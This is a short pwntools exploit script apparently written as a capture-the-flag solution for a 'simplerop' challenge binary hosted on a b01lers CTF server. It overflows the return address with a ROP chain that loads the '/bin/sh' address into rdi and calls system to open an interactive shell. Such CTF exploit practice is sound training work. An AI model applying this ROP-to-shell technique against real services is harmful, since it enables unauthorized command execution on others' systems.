#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./simplerop")

if args.REMOTE:
    io = remote("chal.ctf.b01lers.com", 1008)
else:
    io = process(exe.path)

ret_offset = cyclic_find(0x61616163)
bin_sh_addr = next(exe.search(b"/bin/sh"))
system_call = 0x004011df

r = ROP(exe)
p = fit({ret_offset: [r.rdi.address, bin_sh_addr, system_call]})
io.send(p)
io.interactive()
